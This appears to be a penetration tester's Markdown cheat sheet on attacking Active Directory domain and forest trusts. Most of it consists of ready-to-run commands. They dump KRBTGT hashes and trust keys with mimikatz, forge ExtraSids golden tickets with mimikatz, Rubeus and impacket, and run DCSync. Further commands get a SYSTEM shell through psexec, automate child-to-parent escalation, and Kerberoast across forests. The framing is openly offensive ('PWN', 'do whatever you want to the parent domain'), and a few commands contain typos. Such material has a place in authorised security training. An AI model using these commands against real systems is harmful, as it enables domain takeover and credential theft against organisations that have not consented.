A [trust](https://social.technet.microsoft.com/wiki/contents/articles/50969.active-directory-forest-trust-attention-points.aspx) is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain. 
	Transitive -- trust is extended to child domain trusts. If A=B and B=C, then A=C
	Non-Transitive -- Only child domain is trusted
	One-way trust - one way trust...
	Bidirectional trust -- trust goes both ways

## Enumerating Trust Relationships

Enumerating Trust relationships
```PowerShell
# built-in module
Import-Module activedirectory # native to powershell
Get-ADTrust -Filter *

# PowerView
Import-Module .\PowerView.ps1
Get-DomainTrust          # Check for existing trusts
Get-DomainTrustMapping   # map the existing trusts

# netdom (cmd)
netdom query /domain:<domain> trust           # query trusts
netdom query /domain:<domain> dc              # query DCs
netdom query /domain:<domain> workstation     # query workstations

# BloodHound
Map Domain Trusts prebuilt query
```

IntraForest property: True indicates a child domain
ForestTransitive property: True indicates this is a forest trust OR external trust

Enumerating Users in Child Domains
```PowerShell
Get-DomainUser -Domain <child_domain> | select SamAccountName
```

## Attacking Domain Trusts -- Child -> Parent
This it if TrustDirection = 3 (bidirectional) and trustAttributes: 32


If we PWN a Child Domain, we may be able to escalate to the Parent Domain via SID History Injection.

During a domain migration, a user's original security identifier (SID) is added to the new account's [SID-History](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute, which ensures they retain access to old resources. Attackers can exploit this by injecting an administrator's SID into the sidHistory of a less-privileged account they control. This grants the account administrative privileges upon LOGIN, enabling actions like DCSync and Golden Ticket attacks for full domain control.

Requirements:
	Child Domain (will need full control)
		KRBTGT hash
		SID
		name of target user (does not need to exist!)
		FQDN
	Root Domain
		SID of Enterprise Admins group

Note - We can use mimikatz to dump trust keys
```powershell
mimikatz.exe "privilege::debug" "lsadump::trust /patch" "exit"
```
#### ExtraSids Attack (Golden Ticket) -- Windows
```powershell
# Collecting Our Requirements
.\mimikatz.exe
lsadump::dcsync /user:<domain\krbtgt>  # Obtain KRBTGT Hash (Mimikatz)

Import-Module .\PowerView.ps1
Get-DomainSID                          # Get Domain SID (also in mimikatz output)

net user /domain                       # potential targets (or make it up (hacker))

Get-DomainGroup -Domain <domain> -Identity "Enterprise Admins" | select distinguishedname,objectsid            # Enterprise Admin SID

# Create Golden Ticket with Mimikatz
.\mimikatz.exe
kerberos::golden /user:hacker /domain:<CHILD_FQDN> /sid:<child_domain_SID> /krbtgt:<NTLM_hash> /sids:<Enterprise Admins SID> /ptt

or
# Crete Golden Ticket with Rubeus
.\Rubeus.exe golden /rc4:<krbtgt_NTLM_hash> /domain:<child_FQDN> /sid:<child_domain_SID>  /sids:<Enterprise Admins SID> /user:hacker /ptt

# Confirmation
klist

# Test with DCSync Attack
.\mimikatz.exe
lasdump::dcsync /user:<DOMAIN>\<domain admin> /domain:<FQDN>  # specify FQDN
```
From here you can then do whatever you want to the parent domain...


#### ExtraSids Attack (Golden Ticket) -- Linux
```Bash
## Collect Requirements
impacket-secretsdump <child_domain>/<user>@<ip> -just-dc-user <DOMAIN>/krbtgt 
impacket-lookupsid <child_domain>/<user>@<ip> | grep "Domain SID"

# Identify parent dc
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain> <child_dc_ip>
	# Be sure to add tunnel after

# Identify parent sid
# NOTE: Bloodhound might already have this... MATCH (m:Domain) return m
impacket-lookupsid <child_domain>/<user>@<parent_DC_ip> | grep "Domain SID"
	# Add -519 to the end for EA SID

# Create Golden Ticket (Forged Inter-Realm ticket)
impacket-ticketer -nthash <krbtgt hash> -domain <child FQDN> -domain-sid <child SID> -extra-sid <parent_domain_sid-519> -spn 'krbtgt/<parent_domain>' Administrator
	# Forged user can be anyone we want

# Set KRB5CCNAME env variable
export KRB5CCNAME=hacker.ccache

# PWN with SYSTEM shell
impacket-psexec <child FQDN>/hacker@<DC hostname>.<domain>.local -k -no-pass -target-ip <DC_IP>

__________________________________________________________________________
# AUTOMATED escalation from child to parent domain and authentication to parent DC
impacket-raiseChild -target-exec <DC_IP> <child FQDN>/<child_local_adm>

```

## Attacking Domain Trusts -- Cross-Forest Trust Abuse

#### Cross-Forest Kerberoasting
Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction.

Windows
```powershell
# Enumerate Accounts with Associated SPNs
Import-Module .\PowerView.ps1
Get-DomainUser -SPN -Domain <FQDN> | select SamAccountName
Get-DomainUser -Domain <FQDN> -Identity <Account> |select samaccountname,memberof

# Kerberoast using Rubeus
.\Rubeus.exe kerberoast /domain:<FQDN> /user:<Account> /nowrap

# Crack with Hashcat
```

Linux
```bash
# Enumerate Accounts with associated SPNs
impacket-GetUserSPNs -target-domain <FQDN of other forest> <DOMAIN/user we control>

# Kerberoast 
impacket-GetUserSPNs -request -target-domain <FQDN of forest> <DOMAIN/user we control>
-outputfile <file>   # redirect hash to file 

# Crack with hashcat
```


#### Admin Password Re-Use & Group Membership
Attackers can leverage a bidirectional forest trusts to move from a compromised domain to a trusted one. This is often achieved through password reuse where creds are SHARED between forests.

Another method involves group membership, where a highly privileged user from a compromised domain is a member of an administrative group in the trusting domain

Password Reuse
	just password spray with `nxc` 

Hunting Foreign Group Membership -- Windows
```PowerShell
# Enumerate groups with users that do not belong to domain
Import-Module .\PowerView.ps1
Get-DomainForeignGroupMember -Domain <FQDN> # Make note of SID
Convert-SidToName <SID>

# Access Host of other forest
Enter-PSSession -ComputerName <hostname>.<FQDN of other forest> -Credential <Domain>\<user>
```

Hunting Foreign Group Membership -- Linux
```bash
# Add domain information to /etc/resolv.conf
domain <FQDN> 

# Enumerate groups with users that do not belong to domain
bloodhound-python -d <FQDN> -dc <dc_hostname> -c All -u <user> -p <pass>

# Compress resultant files into 1 zip file
zip -r <name>.zip *.json

# Repeat for other AD Forests

# Upload to BloodHound and Enumeration
Dangerous Rights > Users with Foreign Domain Group Membership
```

